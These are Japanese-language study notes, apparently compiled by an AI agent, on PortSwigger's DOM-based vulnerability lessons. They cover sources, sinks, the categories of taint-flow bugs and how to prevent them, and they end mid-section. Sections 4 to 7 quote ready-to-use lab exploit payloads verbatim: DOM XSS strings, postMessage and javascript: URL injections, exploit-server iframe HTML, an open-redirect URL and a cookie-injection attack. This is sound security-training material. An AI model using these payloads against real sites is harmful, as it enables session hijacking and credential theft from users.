# [36] DOM-based vulnerabilities（DOMベース脆弱性 / taint-flow / source→sink）— PortSwigger Web Security Academy

## 取得状況

担当の主対象URL `https://portswigger.net/web-security/dom-based` は、本セッションの送信元プロキシが `portswigger.net` への egress を組織ポリシーで拒否（CONNECT に 403）するため、WebFetch・curl・web.archive.org のいずれでも**直接取得できなかった**（`web.archive.org` `archive.ph` `r.jina.ai` `webcache.googleusercontent.com` `timetravel.mementoweb.org` も同ポリシーで全て 403 CONNECT 拒否。到達可能なのは `raw.githubusercontent.com` と GitHub API のみ）。TLS検証の無効化やプロキシ迂回は禁止されているため行っていない。代わりに以下のフォールバックで内容を復元した。

> **【補完パス 2026-09-18】原文の逐語回収に成功**: PortSwigger 本体は依然ブロックされているが、GitHub 上に PortSwigger Web Security Academy を**逐語コピーしたミラー**を発見し、`raw.githubusercontent.com` 経由で全文取得できた。これにより、初回に WebSearch 要約（partial）でしか得られていなかった各サブページの本文（「arise when …」定義文・impact・コード例・How to prevent）を**原文の一字一句レベルで回収**した。回収内容は既存の cheatsheet ミラー・ラボ解説とも完全整合。詳細は本ノート末尾「## 補完: PortSwigger 原文の逐語回収」を参照。主な回収元:
> - `musclebigger/cyber-security-knowledge-engine` の `data/knowledge-base/dom-based/README.md`（DOM-based トップ＋16サブページ＋DOM clobbering を各ページ `来源：<portswigger URL>` 付きで逐語結合）と `data/portswigger-academy/web-security__cross-site-scripting__dom-based.md`（DOM XSS 本編の逐語、抓取时间 2026-09-05）。
> - `apuromafo/Academia_Backup` の `Portswigger/portswigger_academy_content_md/dom-based/dom-based.md`（DOM-based トップの逐語）。両ミラーはトップページ本文が相互に一致し、cheatsheet の sink 一覧とも一致するため信頼できる逐語コピーと判断。

- **一次同等ソース（sink一覧の逐語転記）**: GitHub リポジトリ `Sivnerof/Sources-And-Sinks-Cheatsheet` の README（`https://raw.githubusercontent.com/Sivnerof/Sources-And-Sinks-Cheatsheet/main/README.md`）。これは PortSwigger の DOM-based レッスン群から source/sink リストと定義文を**そのまま転記した**ファイルで、curl で全文取得成功（full）。source の定義文・sink の定義文・各脆弱性カテゴリの sink 一覧はここから逐語で再現している。
- **ラボ攻略解説（逐語ペイロード・脆弱コード）**: GitHub リポジトリ `frank-leitner/portswigger-websecurity-academy` を `git clone` 成功（full）。DOM-based ラボ5本と DOM XSS ラボ8本の walkthrough を全文取得。攻撃ペイロード・脆弱スクリプトの記述を逐語で収録。
- **各解説ページの本文（説明・対策文）**: 【補完パス前】は WebSearch により PortSwigger 各ページの要約を取得（partial）していたが、【補完パス後】は上記 GitHub 逐語ミラーで**原文を回収済み（full 相当）**。本ノート §4〜§19 の本文・§末尾「補完」節を参照。

| URL | 状態 | 取得方法 | 備考 |
|---|---|---|---|
| https://portswigger.net/web-security/dom-based | partial | egress拒否→GitHubミラー(cheatsheet)でsink一覧をfull逐語再現＋WebSearch要約で本文補完 | portswigger.net は 403 で直接取得不可 |
| https://portswigger.net/web-security/cross-site-scripting/dom-based （DOM XSS本編・sink詳細） | partial | WebSearch要約＋frank-leitnerラボ解説(full) | 直接取得不可 |
| https://portswigger.net/web-security/dom-based/controlling-the-web-message-source （web message経由DOM XSS） | partial | WebSearch要約＋ラボ解説3本(full) | 直接取得不可 |
| https://portswigger.net/web-security/dom-based/web-message-manipulation | partial | WebSearch要約 | 直接取得不可 |
| https://portswigger.net/web-security/dom-based/open-redirection | partial | WebSearch要約＋ラボ解説(full) | 直接取得不可 |
| https://portswigger.net/web-security/dom-based/cookie-manipulation | partial | WebSearch要約＋ラボ解説(full) | 直接取得不可 |
| https://portswigger.net/web-security/dom-based/javascript-injection | partial | WebSearch要約 | 直接取得不可 |
| https://portswigger.net/web-security/dom-based/document-domain-manipulation | partial | WebSearch要約 | 直接取得不可 |
| https://portswigger.net/web-security/dom-based/websocket-url-poisoning | partial | WebSearch要約 | 直接取得不可 |
| https://portswigger.net/web-security/dom-based/link-manipulation | partial | WebSearch要約 | 直接取得不可 |
| https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation | partial | WebSearch要約 | 直接取得不可 |
| https://portswigger.net/web-security/dom-based/local-file-path-manipulation | partial | WebSearch要約 | 直接取得不可 |
| https://portswigger.net/web-security/dom-based/client-side-sql-injection | partial | WebSearch要約 | 直接取得不可 |
| https://portswigger.net/web-security/dom-based/html5-storage-manipulation | partial | WebSearch要約 | 直接取得不可 |
| https://portswigger.net/web-security/dom-based/client-side-xpath-injection | partial | WebSearch要約 | 直接取得不可 |
| https://portswigger.net/web-security/dom-based/client-side-json-injection | partial | WebSearch要約 | 直接取得不可 |
| https://portswigger.net/web-security/dom-based/dom-data-manipulation | partial | WebSearch要約 | 直接取得不可 |
| https://portswigger.net/web-security/dom-based/denial-of-service | partial | WebSearch要約 | 直接取得不可 |
| https://raw.githubusercontent.com/Sivnerof/Sources-And-Sinks-Cheatsheet/main/README.md | full | curl | sink一覧・定義文を逐語取得 |
| frank-leitner/portswigger-websecurity-academy （15_DOM_based_vulnerabilities, 11_XSS のDOM系ラボ） | full | git clone | ラボ13本のwalkthrough全文 |
| **【補完】** raw.githubusercontent.com/musclebigger/cyber-security-knowledge-engine/main/data/knowledge-base/dom-based/README.md | **full（逐語ミラー）** | curl | DOM-based トップ＋16サブページ＋DOM clobbering の**原文逐語**。各ページに `来源：<portswigger URL>` 付き |
| **【補完】** raw.githubusercontent.com/musclebigger/cyber-security-knowledge-engine/main/data/portswigger-academy/web-security__cross-site-scripting__dom-based.md | **full（逐語ミラー）** | curl | DOM XSS 本編の**原文逐語**（抓取时间 2026-09-05） |
| **【補完】** raw.githubusercontent.com/apuromafo/Academia_Backup/main/Portswigger/portswigger_academy_content_md/dom-based/dom-based.md | **full（逐語ミラー）** | curl | DOM-based トップの原文逐語（muscle と相互一致で検証） |

> 注（初回）: PortSwigger 本体が egress ポリシーで全面ブロックされているため…（下記【補完】で更新）。
>
> **注（補完パス 2026-09-18 更新）**: PortSwigger 本体は依然ブロックされているが、DOM-based トップ・DOM XSS 本編・16サブページ・DOM clobbering の**本文を GitHub 逐語ミラーから原文レベルで回収**した（2つの独立ミラーが相互一致し、cheatsheet の sink 一覧とも整合するため信頼できる逐語コピーと判断）。当初 partial だったサブページ本文は full 相当に格上げ。残る不確実性は「ミラーの抓取時点（2026-09 前後）以降に PortSwigger が原文を改訂した場合の差分」のみであり、技術内容の欠落はほぼ無い。**confidence = high**（原文の未取得ではなく、あくまで公式ドメインからの直接取得ができていない点のみ留保）。

---

## 要約（3〜10行）

DOMベース脆弱性とは、**クライアントサイドの JavaScript が、攻撃者が制御できる「source（源泉）」からデータを読み取り、それを検証せずに危険な「sink（吐き出し口）」へ渡す**ことで発生する脆弱性群である。この source→sink のデータ経路を **taint-flow（汚染フロー）** と呼ぶ。source の代表は URL（`location`）・`document.referrer`・`document.cookie`・`window.name`・`localStorage`／`sessionStorage`・web message（`postMessage`）など。sink は渡されたデータの扱いによって被害が変わり、`innerHTML`・`document.write()`・`eval()`・`location`・jQuery の各関数など多岐にわたる。最も有名なのは **DOM XSS**（sink が HTML/JS を実行）だが、同じ taint-flow の枠組みで、**open redirection・cookie 操作・JavaScript injection・document.domain 操作・WebSocket-URL poisoning・link 操作・web message 操作・AJAX request-header 操作・ローカルファイルパス操作・client-side SQLi・HTML5 storage 操作・XPath injection・client-side JSON injection・DOM-data 操作・DoS** など多数の派生脆弱性が生じる。加えて、XSS が不可能な場面でも `id`/`name` 属性の注入で JS のグローバル変数を DOM ノードで上書きする **DOM clobbering** が DOM-based トピックに含まれる（補完節 B で逐語収録）。共通の根本対策は「**信頼できない source のデータを sink に動的に渡さない**」こと、避けられない場合は**許可リスト（allowlist）による厳格な検証**を行うこと。診断は Burp Suite のスキャナ（静的＋動的解析）や、Burp内蔵ブラウザの **DOM Invader**（canary文字列を source に注入し、到達する sink を可視化）で効率化できる。

---

## 詳細ノート

### 1. DOMベース脆弱性とは / source と sink（出典: /web-security/dom-based, cheatsheet逐語）

DOMベース脆弱性は、**クライアントサイドスクリプトが DOM の制御可能な部分（例: URL）からデータを読み取り、それを安全でない方法で処理する**ときに発生する。攻撃者が制御するデータが、source から sink へと流れる経路を **taint-flow（汚染フロー / テイント・フロー）** と呼ぶ。DOMベース脆弱性を理解・発見するには、この source と sink の概念が中心になる。

#### source（源泉）の定義 — PortSwigger 原文（逐語・cheatsheetより）

> A source is a JavaScript property that accepts data that is potentially attacker-controlled. An example of a source is the location.search property because it reads input from the query string, which is relatively simple for an attacker to control. Ultimately, any property that can be controlled by the attacker is a potential source. This includes the referring URL (exposed by the document.referrer string), the user's cookies (exposed by the document.cookie string), and web messages.

（訳）source とは、攻撃者に制御されうるデータを受け取る JavaScript のプロパティである。代表例は `location.search` プロパティで、クエリ文字列から入力を読み取るため攻撃者が制御しやすい。究極的には、攻撃者が制御できるあらゆるプロパティが潜在的な source になりうる。これには参照元 URL（`document.referrer` 文字列で公開される）、ユーザーの cookie（`document.cookie` 文字列で公開される）、web message が含まれる。

#### sink（吐き出し口）の定義 — PortSwigger 原文（逐語・cheatsheetより）

> A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the eval() function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is document.body.innerHTML because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.

（訳）sink とは、攻撃者が制御するデータを渡されると望ましくない影響を引き起こしうる、危険な可能性のある JavaScript 関数または DOM オブジェクトである。例えば `eval()` 関数は、渡された引数を JavaScript として処理するため sink である。HTML sink の例は `document.body.innerHTML` で、攻撃者が悪意ある HTML を注入して任意の JavaScript を実行できる可能性がある。

**根本原理**: DOMベース脆弱性は、source から取り出したデータが sink に渡る過程で無害化（検証・エスケープ・サニタイズ）されないと成立する。どの sink に渡るかによって、DOM XSS になるか、open redirect になるか、cookie 操作になるか等が決まる。攻撃者は、脆弱なページへ被害者を誘導する URL を作り、ペイロードを URL のクエリ文字列やフラグメント（`#` 以降）部分に仕込む。

### 2. 代表的な source 一覧（出典: cheatsheet 逐語・出典 /web-security/dom-based）

多様な taint-flow 脆弱性の exploit に使える典型的な source は次の通り（cheatsheet より逐語）。

- `document.URL`
- `document.documentURI`
- `document.URLUnencoded`
- `document.baseURI`
- `location`
- `document.cookie`
- `document.referrer`
- `window.name`
- `history.pushState`
- `history.replaceState`
- `localStorage`
- `sessionStorage`
- `IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)`
- `Database`

〔補足（一般知識）〕タスク指示にある `postMessage`／`WebSocket` は「web message（受信メッセージ）」という source カテゴリに相当する。web message は上記リストとは別枠で、`window.addEventListener('message', ...)` の受信ハンドラが受け取る `event.data` が攻撃者制御 source になる（後述 §5）。`location` は `location.search`（クエリ）・`location.hash`（フラグメント）・`location.href`・`location.pathname` などを含む総称。

### 3. 脆弱性カテゴリと「代表 sink」の対応表（出典: /web-security/dom-based の一覧表を再構成）

PortSwigger は DOM-based トップページで、各脆弱性カテゴリと代表 sink を一覧化している。以下は各カテゴリの代表 sink（example sink）の対応（**補完パスで逐語ミラー `musclebigger` `apuromafo` により原文の一覧表を逐語確認済み**。初回の WebSearch 版で Link manipulation の代表 sink を `element.href` としていたが、原文の例示 sink は `element.src` が正。修正済み。なお `element.href` も §11 の完全 sink 一覧には含まれる）。

| DOMベース脆弱性カテゴリ | 代表 sink（example sink） |
|---|---|
| DOM XSS（cross-site scripting） | `document.write()` |
| Open redirection | `window.location` |
| Cookie manipulation | `document.cookie` |
| JavaScript injection | `eval()` |
| Document-domain manipulation | `document.domain` |
| WebSocket-URL poisoning | `WebSocket`（コンストラクタ） |
| Link manipulation | `element.src` |
| Web message manipulation | `postMessage()` |
| Ajax request-header manipulation | `setRequestHeader()` |
| Local file-path manipulation | `FileReader.readAsText()` |
| Client-side SQL injection | `ExecuteSql()` |
| HTML5-storage manipulation | `sessionStorage.setItem()` |
| Client-side XPath injection | `document.evaluate()` |
| Client-side JSON injection | `JSON.parse()` |
| DOM-data manipulation | `element.setAttribute()` |
| Denial of service | `RegExp()` |

以下、各カテゴリごとに「発生条件・被害・sink 完全一覧・対策」を記す。sink 一覧はすべて cheatsheet からの逐語。

---

### 4. DOM XSS（DOM-based cross-site scripting）（出典: /web-security/cross-site-scripting/dom-based, cheatsheet逐語, ラボ解説）

**発生条件**: スクリプトが制御可能なデータ（source）を、安全でない方法で HTML ドキュメントに書き込む（HTML/JS 実行が可能な sink に渡す）と発生。最も一般的なのは、URL などの source から取り出したデータを、`eval()` や `innerHTML` のような動的コード実行を伴う sink へ渡すケース。

**被害**: 攻撃者が制御する URL を被害者が開くと、攻撃者の任意 JavaScript が被害者のブラウザセッションの文脈で実行される。セッショントークンやログイン認証情報の窃取、被害者になりすました任意操作、キーロギングなどが可能。

#### DOM XSS sink 完全一覧（cheatsheet 逐語）

DOM XSS を引き起こしうる主な sink:

- `document.write()`
- `document.writeln()`
- `document.domain`
- `element.innerHTML`
- `element.outerHTML`
- `element.insertAdjacentHTML`
- `element.onevent`

DOM XSS を引き起こしうる jQuery の関数（sink）:

- `add()`
- `after()`
- `append()`
- `animate()`
- `insertAfter()`
- `insertBefore()`
- `before()`
- `html()`
- `prepend()`
- `replaceAll()`
- `replaceWith()`
- `wrap()`
- `wrapInner()`
- `wrapAll()`
- `has()`
- `constructor()`
- `init()`
- `index()`
- `jQuery.parseHTML()`
- `$.parseHTML()`

#### DOM XSS のテスト手法（出典: /web-security/cross-site-scripting/dom-based）

- 手動テストには Chrome など開発者ツールを備えたブラウザを使う。**各 source を1つずつ順番に**テストする。
- **HTML sink のテスト**: ランダムな英数字文字列を source（例: `location.search`）に入れ、開発者ツールで DOM を検査し、その文字列がどこに現れるか（どの HTML 文脈に落ちるか）を確認する。ブラウザの「ページのソースを表示（View source）」は **JavaScript による DOM 変更を反映しないため DOM XSS のテストには使えない**。表示された文脈（属性内、タグ内、テキストノード等）に応じてブレイクアウトできるか検証する。
- **source→sink の追跡**: URL 以外の入力（`document.cookie` 等）や、非HTML sink（`setTimeout` 等）に起因する DOM XSS を見つけるには、JavaScript コードを直接読むしかなく、非常に時間がかかる。
- **jQuery の sink**: `attr()` のような属性設定関数を使い、`location.search`／`location.hash` などの source から取ったデータで `href` 属性等を書き換えていると DOM XSS になりうる。`$()` セレクタ関数に URL フラグメントを渡している場合も注意（後述ラボ参照）。
- **AngularJS**: `ng-app` 属性を持つノード内では AngularJS 式（`{{ }}`）が評価される。テンプレートに source が反映されると client-side template injection → XSS になりうる。

#### DOM XSS の対策（出典: /web-security/cross-site-scripting/dom-based）

- 最も効果的なのは、**信頼できない source のデータを HTML ドキュメントに動的に書き込まない**こと。
- 避けられない場合は、クライアントサイドコードで、データが script として文書に注入されないよう防御する（文脈に応じた出力エンコード、`innerHTML` ではなく `textContent`/`innerText` を使う等）。
- **CSP（Content Security Policy）** は XSS の影響を緩和するブラウザ機構として推奨される。
- 自動検出には **Burp Suite の Web脆弱性スキャナ**が JavaScript の静的解析と動的解析を組み合わせて DOM ベース脆弱性を高信頼で検出する。

#### DOM XSS ラボの逐語ペイプロード（出典: frank-leitner walkthrough, full取得）

**(a) document.write sink × location.search（APPRENTICE）** — 検索語が JS で img タグの src に書き込まれる。埋め込み前後を破って注入。
逐語ペイロード:
```
"><script>alert(document.domain)</script>
```
代替（img の属性として注入）:
```
" onload="alert(document.domain)
```

**(b) innerHTML sink × location.search（APPRENTICE）** — `search` 引数があると span 要素の `innerHTML` が動的変更される。`<script>` は後付け DOM では実行されないため、`onerror` を使う。
逐語ペイロード:
```
foo<img src="xxx" onerror=alert(document.domain)>
```

**(c) document.write sink × location.search（select 要素内）（PRACTITIONER）** — 在庫確認機能で `&storeId=` の値が `document.write` により `<select>` 内に書かれる。option/select/form を閉じてから script を置く。
逐語ペイロード（URL パラメータ）:
```
&storeId=Milan</option></select></form><script>alert(document.domain)</script>
```

**(d) jQuery anchor href attribute sink × location.search（APPRENTICE）** — `/feedback?returnPath=/` の `returnPath` が backLink の `href` 属性に入る。`javascript:` 疑似プロトコルを注入。
逐語ペイロード（returnPath 値）:
```
javascript:alert(document.cookie);
```

**(e) jQuery selector sink × hashchange event（APPRENTICE）** — トップページで `location.hash` の値を `$()` セレクタに渡し該当 post へスクロール。exploit サーバの iframe で `onload` により hash を変更→`hashchange`発火→`img` の `onerror` で実行。
逐語ペイロード（exploitサーバのHTML）:
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=xxx onerror=print()>'"></iframe>
```
（検証用の中間段階では `onerror=alert(document.location)` を使用）

**(f) AngularJS 式（角括弧と二重引用符が HTML エンコードされる）（PRACTITIONER）** — `ng-app` 直下の検索機能。まず `foobar{{1+2}}` で式評価を確認、その後 constructor チェーンで JS 実行。
逐語ペイロード（検索語）:
```
{{constructor.constructor('alert(document.domain)')()}}
```

**(g) Reflected DOM XSS（PRACTITIONER）** — 検索結果が JSON で返り、client 側で `eval` に渡される。サーバは `"` をエスケープするが、`\` を注入すると client 側で `\` がエスケープされ `"` が生きる。
逐語ペイロード（安定版・アプリを壊さない）:
```
\"};alert(document.domain);//
```
（最初に試した版 `\"}+alert(document.domain);//` はアラートは出るがアプリが後続でエラーになる）

**(h) Stored DOM XSS（PRACTITIONER）** — コメント機能。client 側 `escapeHTML` が `<` と `>` を `replace` で置換するが、文字列指定の `replace` は**最初の1組しか置換しない**ため、ダミーの `<>` を先頭に置くと後続タグが生き残る。`innerHTML` で挿入されるため `<img onerror>` が有効。
逐語ペイロード（コメント本文）:
```
<ignored><img src="xxx" onerror=alert(document.domain)>
```
（失敗版 `<ignored><script>alert(document.domain)</script>` は、DOM挿入後に script が再パースされないため実行されない）

---

### 5. Web message manipulation / web message 経由 DOM XSS（出典: /web-security/dom-based/web-message-manipulation, /controlling-the-web-message-source, ラボ解説）

**発生条件**: `postMessage()` で送られる web message を受信する **event listener が受信データを安全でなく扱う**と脆弱になる。listener が **受信メッセージの origin を正しく検証していない**場合、listener 内で呼ばれるプロパティや関数が sink になりうる。攻撃者は悪意ある iframe をホストし、`postMessage()` で脆弱な listener にデータを渡し、そのデータが親ページの sink（例: `eval()`）に流れる。つまり **web message を source として、あらゆる sink へ悪意あるデータを伝播**できる。

**origin 検証の典型的な欠陥**:
- listener が origin を全く検証せず、送信側が `targetOrigin` に `"*"` を指定していると、ペイロードがそのまま sink（`eval()` 等）に渡る。
- 検証があっても脆弱なことがある。`indexOf` で「`normal-website.com` が origin URL のどこかに含まれるか」だけをチェックしていると、`https://normal-website.com.attacker.net` や `https://attacker.net/?x=normal-website.com` を通してしまう。同じ欠陥は `startsWith()`／`endsWith()` を使った検証にも当てはまる。

**対策**（出典: web-message-manipulation / controlling-the-web-message-source）:
- 信頼できない source のデータを含む web message を**送信しない**。
- クロスオリジンでメッセージを送る際は、**必ず `targetOrigin` に送信先ウィンドウ（具体的な origin）を明示**する（`"*"` を使わない）。
- 受信メッセージの **origin を堅牢に検証**する（`indexOf`/`startsWith`/`endsWith` のような部分一致でなく、完全一致で判定）。

#### web message ラボの逐語ペイロード（出典: frank-leitner walkthrough, full取得）

**DOM XSS using web messages（PRACTITIONER）** — window に message が来ると DOM 要素が無検証で書き換わる。`onerror` を使い、exploit サーバから postMessage を送る。
`postMessage` の構文（MDNより逐語・ラボ内引用）:
```
postMessage(message, targetOrigin)
postMessage(message, targetOrigin, transfer)
```
攻撃の要点: `message` にペイロード、`targetOrigin` は具体的なドメイン（安全のため `*` でなく被害者フルURL）を指定。ペイロードには `<img>` の `onerror` を用いて（DOM挿入後でも実行される形で）JavaScript を仕込む。

**DOM XSS using web messages and JSON.parse（PRACTITIONER）** — 受信 message を `JSON.parse` し、`type` が `load-channel` のとき `url` を iframe に読み込む。`url` に `javascript:` を注入。
逐語ペイロード（JSON メッセージ）:
```json
{
    "type": "load-channel", 
    "url": "javascript:print()"
}
```
逐語 exploit HTML（3層のクォートをエスケープ）:
```html
<iframe 
    src="https://YOUR-LAB-ID.web-security-academy.net/" 
    onload='contentWindow.postMessage("{\"type\": \"load-channel\", \"url\": \"javascript:print()\"}","*");'
></iframe>
```
（JSON RFC 7159 は JSON 内文字列に二重引用符を要求するため、二重引用符をエスケープしている）

**DOM XSS using web messages and a JavaScript URL（PRACTITIONER）** — message に `http:`／`https:` が含まれると `location` をその値へリダイレクト。文字列のどこか（JS コメント内でも可）に `https:` を含めれば検証を通過し、`javascript:` を実行できる。
逐語 exploit HTML の骨格:
```html
<iframe src="URL" onload="contentWindow.postMessage('PAYLOAD','*');">
```
ペイロードは実ペイロード `javascript:print();` と、検証通過用コメント `/*https:*/` の組み合わせ。

---

### 6. DOM-based open redirection（出典: /web-security/dom-based/open-redirection, ラボ解説）

**発生条件**: スクリプトが攻撃者制御データを、**クロスドメインのナビゲーションを引き起こせる sink** に書き込むと発生。

**被害**: 被害者が開くと任意の外部 URL へ遷移させられる URL を構築できる（フィッシングの起点になる）。

#### Open redirection sink 完全一覧（cheatsheet 逐語）
- `location`
- `location.host`
- `location.hostname`
- `location.href`
- `location.pathname`
- `location.search`
- `location.protocol`
- `location.assign()`
- `location.replace()`
- `open()`
- `element.srcdoc`
- `XMLHttpRequest.open()`
- `XMLHttpRequest.send()`
- `jQuery.ajax()`
- `$.ajax()`

**対策**: 最も効果的なのは、信頼できない source のデータでリダイレクト先を動的に設定しないこと。避けられない場合はクライアントサイドで、**許可 URL の許可リスト（whitelist）**を用い、遷移前にターゲットを厳格に検証する。

**ラボ逐語（DOM-based open redirection, PRACTITIONER）**: 各ブログ記事下のリンクが、`url` パラメータが無ければ `/` へ、あれば `http://`/`https://` で始まる `url` 値を遷移先にする（無検証）。
逐語の悪意あるURL:
```
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&url=https://exploit-YOUR-EXPLOIT-ID.web-security-academy.net/exploit
```

---

### 7. DOM-based cookie manipulation（出典: /web-security/dom-based/cookie-manipulation, ラボ解説）

**発生条件**: スクリプトが攻撃者制御データを cookie の値に書き込むと発生。

#### Cookie manipulation sink（cheatsheet 逐語）
- `document.cookie`

**典型例（逐語）**: source のデータを無害化せず `document.cookie` に書くと、単一 cookie に任意値を注入できる:
```
document.cookie = 'cookieName='+location.hash.slice(1);
```

**被害**:
- cookie がセッション追跡に使われる場合、攻撃者が入手した正当トークンを cookie に設定して被害者に使わせる **session fixation（セッション固定）** 攻撃が可能。
- cookie が挙動制御（例: 'production' vs 'demo' モード）に使われる場合、cookie 値を操作して被害者に意図しない動作をさせられる。

**対策**: 信頼できない source のデータを cookie に書かない。避けられない場合は許可リストで検証。

**ラボ逐語（DOM-based cookie manipulation, PRACTITIONER）**: 商品ページのスクリプトが現在ページの URL を無検証で cookie に保存し、「Last viewed product」リンクに反映される。
逐語の攻撃URL（有効な商品URLを保ちつつペイロード付与）:
```
https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&evil='><script>alert(document.domain)</script>
```
逐語の exploit HTML（iframe を仕込み、setTimeout でリロードして cookie を送信＝スクリプトを発火させる）:
```html
<iframe name="victim" id="victim"
    src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" 
></iframe>
<script>
setTimeout(() => {  document.getElementsByName('victim')[0].src = "https://YOUR-LAB-ID.web-security-academy.net"}, 500);
</script>
```

---

### 8. DOM-based JavaScript injection（出典: /web-security/dom-based/javascript-injection）

**発生条件**: スクリプトが攻撃者制御データを **JavaScript として実行**すると発生。

**被害**: 攻撃者制御 URL を被害者が開くと、被害者ブラウザセッションの文脈で任意 JavaScript が実行される。セッショントークンや認証情報の窃取、なりすまし操作、キーロギングなど広範な操作が可能。

#### JavaScript injection sink 完全一覧（cheatsheet 逐語）
- `eval()`
- `Function()`
- `setTimeout()`
- `setInterval()`
- `setImmediate()`
- `execCommand()`
- `execScript()`
- `msSetImmediate()`
- `range.createContextualFragment()`
- `crypto.generateCRMFRequest()`

**対策**: 信頼できない source のデータを JavaScript として実行させない。

---

### 9. DOM-based document-domain manipulation（出典: /web-security/dom-based/document-domain-manipulation）

**背景**: `document.domain` プロパティはブラウザの **same-origin policy（同一オリジンポリシー）** 適用に使われる。異なるオリジンの2ページが**明示的に同じ `document.domain` を設定する**と、その2ページは無制限に相互作用できるようになる。

**発生条件**: スクリプトが攻撃者制御データで `document.domain` を設定すると発生。攻撃者制御 URL を被害者が開くと、応答ページが任意の `document.domain` を設定してしまう。

**ブラウザ側の制約と抜け穴**: ブラウザは `document.domain` に設定できる値に一定の制約を課し、ページの実オリジンと全く異なる値は拒否することがある。ただし**子ドメイン・親ドメインへの変更は許可**されるため、攻撃者はより弱い関連サイトのドメインに切り替えられる可能性がある。さらに一部ブラウザのクセで、無関係なドメインに切り替えられる場合もある。

#### Document-domain manipulation sink（cheatsheet 逐語）
- `document.domain`

**対策**: 信頼できない source のデータで `document.domain` を動的設定しない。プログラム的に設定が必要なら、許容値の固定リストを用意し、その中の値のみ代入する。

〔補足（一般知識）〕`document.domain` による same-origin 緩和は非推奨化が進み、モダンブラウザでは既定で無効化・不可となる方向にある。

---

### 10. DOM-based WebSocket-URL poisoning（出典: /web-security/dom-based/websocket-url-poisoning）

**発生条件**: スクリプトが制御可能データを WebSocket 接続のターゲット URL に使うと発生。

**被害**: 被害者が開くと、被害者ブラウザが**攻撃者制御の URL へ WebSocket 接続**を開いてしまう URL を構築できる。

#### WebSocket-URL poisoning sink（cheatsheet 逐語）
- `WebSocket`（コンストラクタ）

**対策**: 信頼できない source のデータで WebSocket 接続先 URL を動的設定しない。避けられない場合は許可 URL の whitelist で厳格検証。WebSocket エンドポイント URL は**ハードコード**し、ユーザー制御データを URL に混ぜない。

---

### 11. DOM-based link manipulation（出典: /web-security/dom-based/link-manipulation）

**発生条件**: スクリプトが攻撃者制御データを、**現在ページ内のナビゲーション先**（クリック可能なリンクやフォームの送信先 URL など）に書き込むと発生。

**被害**: 任意外部 URL への誘導（フィッシング）、機微なフォームデータの攻撃者サーバへの送信、ファイル/クエリ文字列の改変によるアプリ内の意図しない動作の誘発。

#### Link manipulation sink 完全一覧（cheatsheet 逐語）
- `element.href`
- `element.src`
- `element.action`

**対策**: 信頼できない source のデータで遷移先 URL を動的設定しない。避けられない場合は許可 URL の whitelist で厳格検証。
〔補足（一般知識）〕関連する reverse tabnabbing は、現在のモダン（evergreen）ブラウザでは自動的に防止される（`target=_blank` に暗黙で `noopener` が付与される）。

---

### 12. DOM-based AJAX request-header manipulation（出典: /web-security/dom-based/ajax-request-header-manipulation）

**発生条件**: スクリプトが攻撃者制御データを、`XMLHttpRequest` オブジェクトで発行される AJAX リクエストの**リクエストヘッダ**に書き込むと発生。

**被害**: 影響は当該 HTTP ヘッダがサーバ側処理で果たす役割に依存する。ヘッダが AJAX リクエストの結果挙動を制御している場合、ヘッダ操作で被害者に意図しない動作をさせられる可能性がある。

#### AJAX request-header manipulation sink 完全一覧（cheatsheet 逐語）
- `XMLHttpRequest.setRequestHeader()`
- `XMLHttpRequest.open()`
- `XMLHttpRequest.send()`
- `jQuery.globalEval()`
- `$.globalEval()`

**対策**: 信頼できない source のデータで AJAX リクエストヘッダを動的設定しない。

---

### 13. DOM-based local file-path manipulation（出典: /web-security/dom-based/local-file-path-manipulation）

**発生条件**: スクリプトが攻撃者制御データを、ファイル処理 API の **filename パラメータ**として渡すと発生。

**被害**: 被害者が開くと、被害者ブラウザが**任意のローカルファイルを開いてしまう**URL を構築できる。

#### Local file-path manipulation sink 完全一覧（cheatsheet 逐語）
- `FileReader.readAsArrayBuffer()`
- `FileReader.readAsBinaryString()`
- `FileReader.readAsDataURL()`
- `FileReader.readAsText()`
- `FileReader.readAsFile()`
- `FileReader.root.getFile()`

**対策**: 信頼できない source のデータをファイル処理 API に filename として動的に渡さない。避けられない場合はクライアントサイドで任意ファイルアクセスを防ぐ防御（許可リスト等）を実装。

---

### 14. DOM-based client-side SQL injection（出典: /web-security/dom-based/client-side-sql-injection）

**発生条件**: スクリプトが攻撃者制御データを、client-side SQL クエリに安全でなく組み込むと発生（ブラウザ内蔵の Web SQL Database が対象）。

**被害**: 被害者が開くと、被害者ブラウザのローカル SQL データベースに対し任意 SQL クエリが実行される URL を構築できる。

#### Client-side SQL injection sink（cheatsheet 逐語）
- `executeSql()`

**対策**: 最も効果的なのは、DB アクセス全般で **パラメータ化クエリ（プリペアドステートメント）** を使うこと。手順は2段階: ①クエリ構造を先に指定し各ユーザー入力にプレースホルダを置く、②各プレースホルダの内容を指定する。構造が先に確定するため、②の不正データがクエリ構造を壊せない。JavaScript の `executeSql()` API では、クエリ文字列中に `?`（クエリ文字）でパラメータ化項目を指定し、各項目の値を追加パラメータで渡す。明らかに汚染されていない変数も含め、クエリに組み込む変数は**すべてパラメータ化**することが強く推奨される。
〔補足（一般知識）〕Web SQL Database はレガシー技術で、現在のブラウザでは廃止・非推奨化されている。

---

### 15. DOM-based HTML5-storage manipulation（出典: /web-security/dom-based/html5-storage-manipulation）

**発生条件**: スクリプトが攻撃者制御データをブラウザの HTML5 storage（`localStorage` または `sessionStorage`）に保存すると発生。

**リスク**: これ自体は直接の脆弱性ではないが、アプリが後でその保存データを読み戻して安全でなく処理すると、storage を経由して **DOM XSS や JavaScript injection など他の DOM ベース攻撃**を配送する踏み台になりうる（保存型/stored DOM 脆弱性）。

#### HTML5-storage manipulation sink 完全一覧（cheatsheet 逐語）
- `sessionStorage.setItem()`
- `localStorage.setItem()`

**対策**: 信頼できない source のデータを HTML5 storage に入れない。避けられない場合はクライアントサイドで保存を防ぐ防御を実装。

---

### 16. DOM-based client-side XPath injection（出典: /web-security/dom-based/client-side-xpath-injection）

**発生条件**: スクリプトが攻撃者制御データを XPath クエリに組み込むと発生。

